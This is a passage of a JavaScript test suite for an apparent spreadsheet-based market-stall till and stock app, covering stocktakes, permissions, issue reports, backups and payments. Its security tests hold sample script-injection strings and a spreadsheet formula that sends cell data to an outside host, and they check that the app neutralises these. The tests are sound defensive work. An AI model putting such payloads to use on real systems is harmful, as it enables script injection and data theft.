  SF.append('batches', { BatchId: 'B1', When: new Date(), ProductId: 'P01', Made: 10, CostLines: '[]', TotalCost: 200, CostPerUnit: 20 });
  SF.setPin('cashier', '1111'); SF.setPin('manager', '2222');
  env.cashier = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  env.manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  return env;
}
let cop = 0;
const act = (SF, action, token, extra) => SF.dispatch(action, Object.assign({ token, opId: 'k' + (cop++) }, extra || {}));

test('stocktake: a manager starts it, a cashier cannot', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countStart', cashier).ok, false);
  const r = act(SF, 'countStart', manager);
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(act(SF, 'countStart', manager).ok, false, 'only one at a time');
  const st = SF.dispatch('countState', { token: cashier }).data;
  assert.strictEqual(st.open.id, r.id);
  assert.strictEqual(st.canApprove, false);
  assert.strictEqual(st.open.review, undefined, 'only the owner sees the review');
  assert.strictEqual(JSON.stringify(st.open.locations.map((l) => l.status)), '["todo","todo","todo"]');
});

test('the connector can read a stocktake: counted against what the app shows, and changes nothing', () => {
  const { SF, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 9 }] });
  const before = SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand;
  const r = SF.ASSISTANT_TOOLS.stallflow_stocktake.run({});
  assert.strictEqual(r.status, 'open'); assert.strictEqual(r.id, id);
  const l = r.lines.filter((x) => x.id === 'P01')[0];
  assert.strictEqual(l.counted, 9); assert.strictEqual(l.appNow, before);
  assert.strictEqual(SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand, before, 'reading changed nothing');
});

test('stocktake: anyone counts a location; counting it again replaces the first count', () => {
  const { SF, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countClaim', cashier, { countId: id, location: 'Storeroom' });
  let loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'counting');
  assert.ok(act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 9 }] }).ok);
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 2 }] });
  act(SF, 'countSave', manager, { countId: id, location: 'Car', lines: [{ id: 'P02', qty: 3 }] });
  loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'done'); assert.strictEqual(loc.items, 9);
  const review = SF.dispatch('countState', { token: tok }).data.open.review;
  const p1 = review.find((r) => r.id === 'P01'), p2 = review.find((r) => r.id === 'P02');
  assert.strictEqual(JSON.stringify([p1.expected, p1.counted, p1.diff]), '[10,7,-3]', 'the later Storeroom count wins');
  assert.strictEqual(JSON.stringify([p2.expected, p2.counted, p2.diff]), '[6,5,-1]', 'two locations add up');
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Garden shed', lines: [] }).ok, false);
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: -2 }] }).ok, false);
});

test('stocktake: the owner approves; stock follows the count and the loss is recorded at cost', () => {
  const { SF, sheets, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 8 }] });
  assert.strictEqual(act(SF, 'countApprove', manager, { countId: id }).ok, false, 'Marian approves, not a manager');
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.result.lossUnits, 3);
  assert.strictEqual(r.result.lossValue, 60, '3 Apricot Jam at R20 each');
  assert.strictEqual(r.result.foundUnits, 2);
  const hand = SF.onHand();
  assert.strictEqual(hand.P01, 7); assert.strictEqual(hand.P02, 8);
  const moves = sheets.Movements.rows.filter((m) => m[3] === 'stocktake');
  assert.strictEqual(moves.length, 2, 'two ledger lines, nothing overwritten');
  assert.ok(moves.every((m) => m[4] === 'Stocktake ' + id));
  const st = SF.dispatch('countState', { token: tok }).data;
  assert.strictEqual(st.open, null);
  assert.strictEqual(st.history[0].status, 'approved');
  assert.strictEqual(st.history[0].result.lossValue, 60);
});

test('stocktake: what nobody counted is left alone, unless the owner says there are none', () => {
  const { SF, tok, cashier } = counting();
  let id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  let r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.result.uncounted, 1);
  assert.strictEqual(SF.onHand().P02, 6, 'Fig Jam kept');
  id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  r = act(SF, 'countApprove', tok, { countId: id, uncounted: 'zero' });
  assert.strictEqual(SF.onHand().P02, 0, 'none left');
  assert.strictEqual(r.result.lossUnits, 6);
});

const waitMs = (ms) => { const t = Date.now() + ms; while (Date.now() < t); };
const sellOne = (SF, tok, id, n, op) => assert.ok(SF.dispatch('sell', { token: tok, opId: op, lines: [{ id, qty: n }], paid: 'cash' }).ok);

test('stocktake: a sale made after a location was counted is kept, not taken off twice', () => {
  const { SF, tok, cashier } = counting();
  const id = act(SF, 'countStart', tok).id;            // P01: 10 on hand
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 12 }] });   // found 2 more than the app had
  waitMs(5);
  sellOne(SF, tok, 'P01', 2, 'a1');                    // sold after it was counted
  const review = SF.dispatch('countState', { token: tok }).data.open.review.find((r) => r.id === 'P01');
  assert.strictEqual(JSON.stringify([review.expected, review.counted, review.diff, review.now, review.soldSince]), '[10,12,2,8,2]');
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.ok(r.ok, r.message);
  assert.strictEqual(SF.onHand().P01, 10, 'counted 12, less the 2 sold afterwards; never 8 or 12');
  assert.strictEqual(r.result.check.counted, 12);
  assert.strictEqual(r.result.check.app, 10);
  assert.strictEqual(r.result.check.movedSince, 2, 'the whole gap is the sale made after the count');
});

test('stocktake: a sale made before the count is already in what was counted', () => {
  const { SF, tok, cashier } = counting();
  const id = act(SF, 'countStart', tok).id;
  sellOne(SF, tok, 'P01', 2, 'b1');                    // sold while the stocktake was open, before counting
  waitMs(5);
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 8 }] });
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.ok(r.ok, r.message);
  assert.strictEqual(SF.onHand().P01, 8, 'the shelf had 8, the app already said 8: nothing to move');
  assert.strictEqual(r.result.moved, 0);
  assert.strictEqual(r.result.check.movedSince, 0);
});

test('stocktake: two locations counted at different times, with a sale in between', () => {
  const { SF, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P02', qty: 4 }] });
  waitMs(5);
  sellOne(SF, tok, 'P02', 1, 'c1');                    // between the two counts
  waitMs(5);
  act(SF, 'countSave', manager, { countId: id, location: 'Car', lines: [{ id: 'P02', qty: 1 }] });
  waitMs(5);
  sellOne(SF, tok, 'P02', 1, 'c2');                    // after both
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.ok(r.ok, r.message);
  assert.strictEqual(SF.onHand().P02, 4, 'counted 5 in all, minus the 1 sold after the last count');
});

test('stocktake: what nobody counted goes to 0 from what is on hand now, never below', () => {
  const { SF, tok, cashier } = counting();
  const id = act(SF, 'countStart', tok).id;            // P02: 6 on hand
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  waitMs(5);
  sellOne(SF, tok, 'P02', 2, 'd1');                    // P02 is now 4; the start snapshot said 6
  const r = act(SF, 'countApprove', tok, { countId: id, uncounted: 'zero' });
  assert.ok(r.ok, r.message);
  assert.strictEqual(SF.onHand().P02, 0, 'ends at 0, not -2');
  assert.strictEqual(r.result.lossUnits, 4);
  // already negative: approval leaves it, it does not make it worse
  SF.move('P02', -3, 'sale', 'test');
  const id2 = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id2, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  act(SF, 'countApprove', tok, { countId: id2, uncounted: 'zero' });
  assert.strictEqual(SF.onHand().P02, -3);
});

test('an earlier stocktake can be read back: counts, what the app had, and what approval moved', () => {
  const { SF, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }] });
  waitMs(5);
  act(SF, 'countApprove', tok, { countId: id });
  const d = SF.dispatch('countDetail', { token: manager, countId: id }).data;
  assert.strictEqual(d.ok, true); assert.strictEqual(d.status, 'approved');
  assert.strictEqual(d.locations[0].name, 'Storeroom'); assert.strictEqual(d.locations[0].items, 7);
  const l = d.lines.find((x) => x.id === 'P01');
  assert.strictEqual(JSON.stringify([l.hadAtCount, l.counted, l.diff, l.applied]), '[10,7,-3,-3]');
  assert.strictEqual(SF.dispatch('countDetail', { token: cashier, countId: id }).code, 'forbidden', 'cashiers cannot open it');
  assert.strictEqual(SF.dispatch('countDetail', { token: tok, countId: 'ST999' }).data.ok, false);
  // a cancelled one can be read too, and moved nothing
  const id2 = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id2, location: 'Car', lines: [{ id: 'P01', qty: 1 }] });
  act(SF, 'countCancel', manager, { countId: id2 });
  const c = SF.dispatch('countDetail', { token: manager, countId: id2 }).data;
  assert.strictEqual(c.status, 'cancelled'); assert.strictEqual(c.lines.find((x) => x.id === 'P01').applied, 0);
});

test('batch: several changes in one request, each checked and de-duplicated on its own', () => {
  const { SF, tok } = counting();
  const ops = [
    { action: 'adjustStock', opId: 'bx1', productId: 'P01', qty: 3, reason: 'a' },
    { action: 'adjustStock', opId: 'bx2', productId: 'P01', qty: 4, reason: 'b' },
    { action: 'nope', opId: 'bx3' }
  ];
  const r = SF.dispatch('batch', { token: tok, ops }).data;
  assert.strictEqual(r.results.length, 3);
  assert.strictEqual(r.results[0].res.ok, true); assert.strictEqual(r.results[1].res.ok, true);
  assert.ok(/Unknown action/.test(r.results[2].res.message), 'an unknown change is answered, not swallowed');
  const before = SF.onHand().P01;
  SF.dispatch('batch', { token: tok, ops: ops.slice(0, 2) });        // the same two sent again (reply was lost)
  assert.strictEqual(SF.onHand().P01, before, 'sent twice, ran once');
  const bad = SF.dispatch('batch', { token: 'junk', ops: [ops[0]] }).data;
  assert.strictEqual(bad.results[0].res.code, 'auth', 'a wrong token still stops each change');
  assert.strictEqual(bad.results.length, 1);
  const own = SF.dispatch('batch', { token: tok, ops: [{ action: 'batch', opId: 'z', ops: [] }] }).data;
  assert.strictEqual(own.results[0].res.ok, false, 'no batches inside batches');
});

test('a request reads each sheet once, however many times the code asks for it', () => {
  const { SF, tok } = markets3();
  SF.append('markets', { MarketId: 'M09', Name: 'Third Market', Date: day(0), Status: 'planned' });
  SF.dispatch('till', { token: tok });                                // warm: creates and caches the sheet objects
  const sheet = SF.sheet('orders'); let reads = 0;
  const gr = sheet.getRange.bind(sheet);
  sheet.getRange = (...a) => { const r = gr(...a); const gv = r.getValues; if (gv) r.getValues = () => { reads++; return gv.call(r); }; return r; };
  SF.dispatch('till', { token: tok });
  assert.ok(reads <= 1, 'orders sheet read ' + reads + ' times in one till request');
  // and a write is never hidden from the next read
  SF.dispatch('sell', { token: tok, opId: 'cache1', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' });
  assert.strictEqual(SF.orders().length >= 1, true);
});

test('stocktake: managers edit the locations; the list stays tidy', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countLocationsSave', cashier, { locations: ['X'] }).ok, false);
  const r = act(SF, 'countLocationsSave', manager, { locations: [' Storeroom ', 'storeroom', 'Car  boot', '', 'Kitchen'] });
  assert.strictEqual(JSON.stringify(r.locations), '["Storeroom","Car boot","Kitchen"]');
  assert.strictEqual(act(SF, 'countLocationsSave', manager, { locations: [] }).ok, false);
  assert.strictEqual(SF.dispatch('countState', { token: cashier }).data.locations.length, 3);
});

/* ---------- security: who may change things, and what text may hold ---------- */

test('a viewer sees the numbers but cannot change how the stall runs', () => {
  const { SF, tok } = markets3();
  SF.setPin('viewer', '3333'); SF.setPin('manager', '2222');
  const viewer = SF.dispatch('signIn', { pin: '3333', device: 'v' }).data.token;
  const manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  let k = 0;
  const tryAs = (t, action, extra) => SF.dispatch(action, Object.assign({ token: t, opId: 'sec' + (k++) }, extra || {}));
  [['setPreordersOpen', { open: false }], ['addMarket', { name: 'Sneaky Market' }], ['releaseUnpaid', {}],
   ['setActiveMarket', { marketId: 'M02' }], ['saveLabelLook', { contact: 'x' }], ['setCollectStep', { on: true }],
   ['setHomeOrders', { open: false }], ['savePluginSettings', { plugin: 'cashup', values: {} }],
   ['saveProfile', { name: 'X' }]].forEach(([a, extra]) => {
    const r = tryAs(viewer, a, extra);
    assert.strictEqual(r.ok, false, a + ' should be refused for a viewer');
    assert.strictEqual(r.code, 'forbidden', a);
  });
  assert.strictEqual(SF.dispatch('dashboard', { token: viewer }).ok, true, 'the numbers still work for a viewer');
  assert.strictEqual(tryAs(manager, 'setPreordersOpen', { open: true }).ok, true, 'a manager may');
  assert.strictEqual(tryAs(manager, 'addMarket', { name: 'Real Market', date: day(4) }).ok, true);
  assert.strictEqual(tryAs(tok, 'setActiveMarket', { marketId: 'M02' }).ok, true, 'and the owner');
});

test('a market date must be a date, and the live market must exist', () => {
  const { SF, tok } = markets3();
  const bad = SF.dispatch('addMarket', { token: tok, opId: 'd1', name: 'Bad', date: '2099-01-01<img src=x onerror=alert(1)>' });
  assert.strictEqual(bad.ok, false);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd2', name: 'Good', date: '2026-12-05' }).ok, true);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd3', name: 'No date yet' }).ok, true);
  assert.strictEqual(SF.dispatch('setActiveMarket', { token: tok, opId: 'd4', marketId: 'zzz' }).ok, false);
  assert.strictEqual(SF.get('activeMarket'), 'M01', 'unchanged');
});

test('shop words are plain text, when saved and when read back from older data', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'v1', colour: 'red;background:url(x)',
    vocab: { units: '<img src=x onerror="steal()">jars', unit: 'jar', evil: 'x' }, plugins: ['cashup', 'nope'] });
  let pr = SF.profile();
  assert.ok(!/[<>"=]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.vocab.evil, undefined, 'unknown words are dropped');
  assert.strictEqual(pr.colour, '#7B2D43', 'a colour must be a colour');
  assert.strictEqual(JSON.stringify(pr.plugins), '["cashup"]');
  // Data stored before this check existed is cleaned on the way out.
  SF.set('profile', JSON.stringify({ vocab: { units: '<script>bad()</script>' }, colour: 'javascript:x' }));
  pr = SF.profile();
  assert.ok(!/[<>()]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.colour, '#7B2D43');
});

test('Export orders keeps a customer name that starts with = as text', () => {
  const { SF, sheets, ctx } = markets3();
  assert.strictEqual(order(SF, { market: 'M01', name: '=IMAGE("https://e.tld/?"&A1)' }).ok, true);
  ctx.sfExport();
  const out = Object.keys(sheets).filter((n) => /^Orders \d/.test(n)).map((n) => sheets[n])[0];
  assert.ok(out, 'the export tab was made');
  const cell = out.rows[1][4];
  assert.ok(String(cell).startsWith("'="), 'stays text: ' + cell);
});

/* ---------- reporting a problem ---------- */

function reporter(role) {
  const env = shop(day(3));
  env.SF.setPin('owner', '4321');
  if (role !== 'owner') env.SF.setPin(role, '1111');
  const pin = role === 'owner' ? '4321' : '1111';
  env.tok = env.SF.dispatch('signIn', { pin, device: 'd' }).data.token;
  return env;
}

test('a cashier can report a problem; it is kept in the Issues tab', () => {
  const { SF, sheets, tok, gh } = reporter('cashier');
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r1', message: 'Take payment does nothing', screen: 'till' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, false, 'no GitHub token yet, so only the sheet has it');
  assert.strictEqual(gh.length, 0);
  const row = sheets.Issues.rows[1];
  assert.strictEqual(row[5], 'Take payment does nothing');
  assert.ok(String(row[7]).startsWith('saved'), row[7]);
});

test('with a GitHub token the report opens one labelled issue, with no phone number or e-mail', () => {
  const { SF, sheets, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_SECRETSECRET';
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r2', screen: 'till',
    message: 'Anna 082 123 4567 anna@example.com could not pay',
    failed: [{ action: 'sell', message: 'Only 0 left of Guava Jam' }] });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, true);
  assert.strictEqual(gh.length, 1);
  const sent = JSON.parse(gh[0].opts.payload);
  assert.ok(/082|anna@example/.test(JSON.stringify(sent)) === false, 'personal details leaked: ' + sent.body);
  assert.ok(sent.body.indexOf('[number]') !== -1 && sent.body.indexOf('[email]') !== -1);
  assert.deepStrictEqual(sent.labels, ['app-report']);
  assert.ok(sent.body.indexOf('ghp_SECRET') === -1, 'the token must never be in the issue');
  assert.strictEqual(sheets.Issues.rows[1][7], 'sent');
  assert.strictEqual(sheets.Issues.rows[1][8], 'https://github.com/o/r/issues/7');
  assert.ok(/Bearer ghp_/.test(gh[0].opts.headers.Authorization));
});

test('a retried report does not open a second GitHub issue', () => {
  const { SF, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_x';
  SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  const again = SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  assert.strictEqual(again.replayed, true);
  assert.strictEqual(gh.length, 1);
});

test('an empty report is refused and at most 5 an hour are accepted', () => {
  const { SF, tok } = reporter('owner');
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'e', message: 'hi' }).ok, false);
  for (let i = 0; i < 5; i++) {
    assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n' + i, message: 'Problem number ' + i }).ok, true);
  }
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n6', message: 'One more problem' }).ok, false);
});

test('connecting reports checks the token with GitHub before keeping it', () => {
  const { SF, props } = shop(day(3));
  assert.strictEqual(SF.reportsConnected(), false);
  assert.strictEqual(SF.connectGithub('not a token').ok, false);
  assert.strictEqual(SF.connectGithub('github_pat_' + 'x'.repeat(30)).ok, false, 'GitHub refused it');
  assert.strictEqual(props.GITHUB_TOKEN, undefined, 'a refused token is not kept');
  const r = SF.connectGithub('  github_pat_good' + 'x'.repeat(30) + '  ');
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(props.GITHUB_TOKEN, 'github_pat_good' + 'x'.repeat(30));
  assert.strictEqual(SF.reportsConnected(), true);
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.strictEqual(SF.dispatch('health', { token: tok }).data.reports, true);
});

test('reporting needs a sign-in', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(SF.dispatch('reportIssue', { opId: 'x', message: 'Anything at all' }).ok, false);
});


/* ---------- how each sale was paid ---------- */
const ownerTok = (SF) => { SF.setPin('owner', '4321'); return SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token; };

test('schema 10 adds a Paid heading to an Orders tab that had none', () => {
  const { SF, sheets } = shop(day(3));
  const head = sheets.Orders.rows[0];
  head.length = 15;                                  // an Orders tab from before
  SF.set('schemaVersion', 9);
  const done = SF.migrate();
  assert.ok(done.some((d) => /^10:/.test(d)), done.join(' | '));
  assert.strictEqual(sheets.Orders.rows[0][15], 'Paid');
  assert.ok(SF.SCHEMA >= 10);
});

test('a till sale keeps how it was paid; anything unknown, or nothing, is cash', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const sell = (paid, id) => SF.dispatch('sell', { token: tok, opId: id, marketId: 'M01', paid, lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(sell('card', 's1').ok, true);
  assert.strictEqual(sell('eft', 's2').ok, true);
  assert.strictEqual(sell(undefined, 's3').ok, true);
  assert.strictEqual(sell('bitcoin', 's4').ok, true);
  assert.strictEqual(JSON.stringify(SF.orders().map((o) => o.paid)), JSON.stringify(['card', 'eft', 'cash', 'cash']));
  const d = SF.dispatch('dashboard', { token: tok }).data;
  assert.strictEqual(JSON.stringify(d.summary.byMethod), JSON.stringify({ cash: 140, card: 70, eft: 70 }));
});

test('a pre-order paid by card is recorded as card', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const no = order(SF).orderNo;
  assert.strictEqual(SF.dispatch('markPaid', { token: tok, opId: 'p1', orderNo: no, paid: 'card' }).ok, true);
  assert.strictEqual(SF.findOrder(no).paid, 'card');
});

test('the cash-up only expects the cash in the tin, not card or EFT', () => {
  const { SF } = shop(day(3));
  SF.setPluginEnabled ? SF.setPluginEnabled('cashup', true) : SF.set('plugins', JSON.stringify(['cashup']));
  const tok = ownerTok(SF);
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', paid: 'cash', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M01', paid: 'card', lines: [{ id: 'P01', qty: 1 }] });
  const exp = SF.dispatch('cashup.expected', { token: tok, opId: 'c' });
  const e = exp.data || exp;
  assert.strictEqual(e.cash, 140, JSON.stringify(e));
  assert.strictEqual(e.other, 70);
  const rec = SF.dispatch('cashup.record', { token: tok, opId: 'r', counted: 140 + e.float });
  assert.strictEqual(rec.ok, true, rec.message);
  assert.strictEqual(rec.expected, 140 + e.float, 'card money is not expected in the tin, only cash and the float');
});

/* ---------- weekly backup ---------- */
test('a backup copies every tab, but no customer names or phone numbers', () => {
  const { SF, created } = shop(day(3));
  const tok = ownerTok(SF);
  order(SF, { name: 'Anna Bester', phone: '082 555 0101' });
  SF.dispatch('sell', { token: tok, opId: 't', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  const r = SF.dispatch('backupNow', { token: tok }).data;
  assert.strictEqual(r.ok, true);
  const b = created[0];
  assert.ok(!b.tabs.Sheet1, 'the empty first tab is gone');
  for (const t of ['Products', 'Orders', 'Movements', 'Markets']) assert.ok(b.tabs[t], t + ' copied');
  const text = JSON.stringify(b.tabs.Orders.rows);
  assert.ok(text.indexOf('Anna') === -1 && text.indexOf('082 555') === -1, 'customer details left out: ' + text);
  assert.ok(text.indexOf('Walk-up') !== -1, 'till sales keep their Walk-up name');
  assert.strictEqual(b.tabs.Products.rows[1][1], 'Apricot Jam');
  assert.strictEqual(SF.dispatch('health', { token: tok }).data.backup.url, r.url);
});

test('a backup survives a cell over the 50,000-character limit (the label logo) and a tab that will not copy', () => {
  const { SF, created, ctx } = shop(day(3));
  const tok = ownerTok(SF);
  SF.set('labelLogo', 'data:image/png;base64,' + 'A'.repeat(60000));
  const r = SF.dispatch('backupNow', { token: tok }).data;
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const longest = Math.max.apply(null, [].concat.apply([], created[0].tabs.Settings.rows).map((c) => String(c).length));
  assert.ok(longest <= 50000, 'no cell over the limit: ' + longest);
  // one tab that fails to copy is skipped and named, the rest are kept
  const real = ctx.SpreadsheetApp.create;
  ctx.SpreadsheetApp.create = (n) => { const ss = real(n); const ins = ss.insertSheet; ss.insertSheet = (t) => { if (t === 'Orders') throw new Error('boom'); return ins(t); }; return ss; };
  const r2 = SF.dispatch('backupNow', { token: tok }).data;
  assert.strictEqual(r2.ok, true); assert.strictEqual(JSON.stringify(r2.skipped), '["Orders"]');
  assert.ok(created[1].tabs.Products, 'the other tabs were kept');
  // and when it cannot even start, the owner is told the real reason
  ctx.SpreadsheetApp.create = () => { throw new Error('You do not have permission to call SpreadsheetApp.create'); };
  const r3 = SF.dispatch('backupNow', { token: tok }).data;
  assert.strictEqual(r3.ok, false); assert.ok(/permission to call SpreadsheetApp\.create/.test(r3.message), r3.message);
});

test('the weekly backup runs once a week, and only for an owner or manager', () => {
  const { SF, created } = shop(day(3));
  const tok = ownerTok(SF);
  assert.strictEqual(SF.dispatch('autoBackup', { token: tok }).data.ok, true);
  assert.strictEqual(created.length, 1, 'the first one runs');
  assert.strictEqual(SF.dispatch('autoBackup', { token: tok }).data.skipped, true);
  assert.strictEqual(created.length, 1, 'not again the same week');
  SF.set('lastBackup', JSON.stringify({ at: new Date(Date.now() - 8 * 864e5).toISOString() }));
  SF.set('backupStarted', 0);
  SF.dispatch('autoBackup', { token: tok });
  assert.strictEqual(created.length, 2, 'due again after a week');
  SF.setPin('cashier', '1111');
  const c = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  assert.strictEqual(SF.dispatch('backupNow', { token: c }).code, 'forbidden');
});


/* ---------- sign-in problems: what phones report, and what is never kept ---------- */
test('a sign-in problem report keeps only a stage and a short code, never anything else', () => {
  const { SF, sheets } = shop(day(3));
  const r = SF.dispatch('authError', { stage: 'render', code: 'no-button <script>alert(1)</script> jane@x.com', browser: 'Chrome-Android!!', device: 'abc 123' });
  assert.strictEqual(r.data.ok, true);
  SF.dispatch('authError', { stage: 'load', code: 'blocked', browser: 'chrome-android-app', device: 'abc 123' });
  assert.strictEqual(SF.dispatch('authError', { stage: 'hack', code: 'x' }).data.ok, false, 'an unknown stage is refused');
  const rows = sheets.Audit.rows.filter((x) => x[4] === 'authError');
  assert.strictEqual(rows.length, 2);
  assert.strictEqual(rows[0][6], 'other · other', 'free text is filed as other: ' + rows[0][6]);
  assert.strictEqual(rows[1][6], 'blocked · chrome-android-app');
  assert.ok(!/jane|@|<|script/.test(rows.map((x) => x[5] + ' ' + x[6]).join(' | ')), 'stage and detail are clean');
});

test('no more than 40 sign-in problem reports are kept in an hour', () => {
  const { SF, sheets } = shop(day(3));
  for (let i = 0; i < 60; i++) SF.dispatch('authError', { stage: 'load', code: 'blocked' });
  assert.strictEqual(sheets.Audit.rows.filter((x) => x[4] === 'authError').length, 40);
});

test('Health lists recent sign-in problems for the owner', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  SF.dispatch('authError', { stage: 'network', code: 'unreachable', browser: 'safari-ios' });
  const h = SF.dispatch('health', { token: tok }).data;
  assert.strictEqual(h.signInProblems.length, 1);
  assert.strictEqual(h.signInProblems[0].stage, 'network');
  assert.ok(/unreachable/.test(h.signInProblems[0].detail));
});


/* ---------- every jam in all three sizes ---------- */
const jamStall = () => {
  const env = shop(day(3));
  const { SF } = env;
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots(); SF.newPot = (n) => ctx.sfNewPot(n);
  SF.missingSizes = () => ctx.sfMissingSizes(); SF.addJamSizes = () => ctx.sfAddJamSizes();
  return Object.assign(env, { ctx });
};

test('the stocktake puts every jam on the list in all three sizes, and stock only where it was counted', () => {
  const { SF, ctx } = jamStall();
  ctx.sfApplyStocktake();
  const ps = SF.products();
  const jams = ctx.STOCKTAKE.jams.map((j) => j[0]);
  jams.forEach((n) => ['352 ml', '250 ml', '125 ml'].forEach((v) => {
    assert.ok(ps.find((p) => p.name === n && p.variant === v), n + ' ' + v + ' is on the list');
  }));
  const apricot = (v) => ps.find((p) => p.name === 'Apricot' && p.variant === v);
  assert.ok(ps.find((p) => p.name === 'Pineapple / Granadilla' && p.variant === '125 ml'), 'the small Pineapple / Granadilla jar is on the list');
  assert.strictEqual(apricot('250 ml').onHand, 0, 'a size never counted starts at none');
  assert.strictEqual(apricot('250 ml').price, 50);
  assert.strictEqual(apricot('125 ml').onHand, 1, 'counted stock is kept');
  assert.strictEqual(ps.find((p) => p.name === 'Strawberry Gin' && p.variant === '250 ml').price, 60, 'a premium jam gets the premium price in a new size');
  assert.strictEqual(ps.find((p) => p.name === 'Fig Chunky' && p.variant === '125 ml').price, 50);
  assert.ok(apricot('250 ml').cost > 0, 'and its cost is worked out');
});

test('Add the missing sizes adds only what is missing and never touches stock or prices already there', () => {
  const { SF, ctx } = jamStall();
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  // A live sheet as it is today: one jam, in one size, at her own price, with stock.
  SF.append('products', { ProductId: 'P50', Name: 'Apricot', Variant: '352 ml', Type: 'stocked', Category: 'Jams', Unit: 'each', Price: 72, Active: 'Yes', Sort: 5 });
  SF.move('P50', 2, 'adjust', 'count');
  SF.append('products', { ProductId: 'P51', Name: 'Mulberry', Variant: '125 ml', Type: 'stocked', Category: 'Jams', Unit: 'each', Price: 45, Active: 'No', Sort: 6 });
  const before = SF.dispatch('stock', { token: tok }).data.sizesMissing;
  assert.strictEqual(before, ctx.STOCKTAKE.jams.length * 3 - 2, 'every size but the two there is missing');
  const r = SF.dispatch('addJamSizes', { token: tok, opId: 'ads1' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.added, before);
  const ps = SF.products({ all: true });
